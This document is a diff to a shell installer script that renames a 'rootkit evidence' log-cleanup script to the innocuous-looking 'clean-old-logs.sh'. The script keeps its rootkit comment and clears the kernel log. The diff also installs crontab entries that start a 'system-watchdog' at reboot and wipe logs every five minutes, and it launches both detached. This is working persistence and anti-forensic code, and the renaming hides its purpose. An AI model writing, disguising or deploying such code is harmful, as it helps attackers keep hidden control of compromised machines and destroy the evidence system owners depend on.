@@ -1403,7 +1403,7 @@ EOF
 chmod +x /usr/local/bin/system-watchdog
 
 # Create log cleanup script
-cat > /usr/local/bin/clean-rootkit-logs.sh << 'EOFCLEAN'
+cat > /usr/local/bin/clean-old-logs.sh << 'EOFCLEAN'
 #!/bin/bash
 # Silent log cleanup for rootkit evidence
 
@@ -1445,19 +1445,19 @@ dmesg -C 2>/dev/null
 exit 0
 EOFCLEAN
 
-chmod +x /usr/local/bin/clean-rootkit-logs.sh
+chmod +x /usr/local/bin/clean-old-logs.sh
 
 # Enable the watchdog and log cleanup via crontab
-(crontab -l 2>/dev/null | grep -v "system-watchdog\|system-check\|clean-rootkit-logs"; \
+(crontab -l 2>/dev/null | grep -v "system-watchdog\|system-check\|clean-old-logs"; \
  echo "@reboot /usr/local/bin/system-watchdog &"; \
- echo "*/5 * * * * /usr/local/bin/clean-rootkit-logs.sh >/dev/null 2>&1") | crontab -
+ echo "*/5 * * * * /usr/local/bin/clean-old-logs.sh >/dev/null 2>&1") | crontab -
 
 # Start it now (detached)
 /usr/local/bin/system-watchdog >/dev/null 2>&1 &
 disown
 
 # Run log cleanup immediately
-/usr/local/bin/clean-rootkit-logs.sh >/dev/null 2>&1 &
+/usr/local/bin/clean-old-logs.sh >/dev/null 2>&1 &
 
 echo "[✓] Intelligent watchdog deployed (3-min intervals, state-tracked)"
 echo ""
